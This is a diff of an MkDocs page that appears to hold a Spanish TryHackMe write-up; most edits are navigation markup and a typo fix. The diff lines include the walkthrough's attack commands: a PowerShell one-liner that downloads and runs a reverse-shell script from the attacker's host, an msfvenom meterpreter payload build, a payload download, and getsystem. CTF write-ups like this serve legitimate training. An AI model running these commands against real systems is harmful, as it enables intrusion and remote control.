@@ -198,9 +198,7 @@
 
 
 
-  
-
-<nav class="md-nav md-nav--primary md-nav--integrated" aria-label="Navigation" data-md-level="0">
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
   <label class="md-nav__title" for="__drawer">
     <a href="../.." title="rdrg0x" class="md-nav__button md-logo" aria-label="rdrg0x" data-md-component="logo">
       
@@ -576,6 +574,62 @@
 
               
             
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../atlas/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Atlas
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../attackingkerberos/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Attacking kerberos
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
           </ul>
         </nav>
       
@@ -624,6 +678,104 @@
                 </div>
               </div>
             
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Enumeration
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Enumeration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#nmap" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Nmap
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#http-80" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        HTTP (80)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#http-8080" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        HTTP (8080)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Exploit
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privilege-escalation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Privilege Escalation
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
             
           
           
@@ -712,13 +864,6 @@
       
       
       
-        <a href="../../tags/#tag:privesc" class="md-tag">privesc</a>
-      
-    
-      
-      
-      
-      
         <a href="../../tags/#tag:tryhackme" class="md-tag">tryhackme</a>
       
     
@@ -768,7 +913,7 @@ Service<span class="w"> </span>Info:<span class="w"> </span>OS:<span class="w"> 
 <p><img alt="alt text" src="img/image-13.png" /></p>
 <h2 id="exploit">Exploit<a class="headerlink" href="#exploit" title="Permanent link">&para;</a></h2>
 <p><img alt="alt text" src="img/image-14.png" /></p>
-<p>Agregar la sigueinte linea de código</p>
+<p>Agregar la siguiente linea de código</p>
 <div class="highlight"><pre><span></span><code><span class="n">powershell</span> <span class="nb">iex </span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadString</span><span class="p">(</span><span class="s1">&#39;http://10.9.244.36:8282/Invoke-PowerShellTcp.ps1&#39;</span><span class="p">);</span><span class="nb">Invoke-PowerShellTcp</span> <span class="n">-Reverse</span> <span class="n">-IPAddress</span> <span class="n">10</span><span class="p">.</span><span class="n">9</span><span class="p">.</span><span class="n">244</span><span class="p">.</span><span class="n">36</span> <span class="n">-Port</span> <span class="n">1234</span>
 </code></pre></div>
 <div class="highlight"><pre><span></span><code>python3<span class="w"> </span>-m<span class="w"> </span>http.server<span class="w"> </span><span class="m">8282</span><span class="w"> </span>
@@ -782,7 +927,7 @@ nc<span class="w"> </span>-nvlp<span class="w"> </span><span class="m">1234</spa
 79007a09481963edf2e1321abd9ae2a0
 </code></pre></div>
 <h2 id="privilege-escalation">Privilege Escalation<a class="headerlink" href="#privilege-escalation" title="Permanent link">&para;</a></h2>
-<div class="highlight"><pre><span></span><code>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/meterpreter/reverse_tcp<span class="w"> </span>-a<span class="w"> </span>x86<span class="w"> </span>--encoder<span class="w"> </span>x86/shikata_ga_nai<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span><span class="m">10</span>.9.244.36<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">5555</span><span class="w"> </span>-f<span class="w"> </span>exe<span class="w"> </span>-o<span class="w"> </span>revshell.exe<span class="w">   </span>
+<div class="highlight"><span class="filename">revshell.exe</span><pre><span></span><code>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/meterpreter/reverse_tcp<span class="w"> </span>-a<span class="w"> </span>x86<span class="w"> </span>--encoder<span class="w"> </span>x86/shikata_ga_nai<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span><span class="m">10</span>.9.244.36<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">5555</span><span class="w"> </span>-f<span class="w"> </span>exe<span class="w"> </span>-o<span class="w"> </span>revshell.exe<span class="w">   </span>
 </code></pre></div>
 <div class="highlight"><pre><span></span><code><span class="n">powershell</span> <span class="s2">&quot;(New-Object System.Net.WebClient).Downloadfile(&#39;http://10.9.244.36:8001/revshell.exe&#39;,&#39;revshell.exe&#39;)&quot;</span>
 </code></pre></div>
@@ -878,7 +1023,7 @@ meterpreter<span class="w"> </span>&gt;<span class="w"> </span>getsystem
     
       
       
-      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.instant", "navigation.tracking", "navigation.sections", "navigation.expand", "navigation.path", "toc.integrate", "content.code.copy", "search.highlight"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.instant", "navigation.tracking", "navigation.sections", "navigation.expand", "navigation.path", "content.code.copy", "search.highlight"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
     
     
       <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
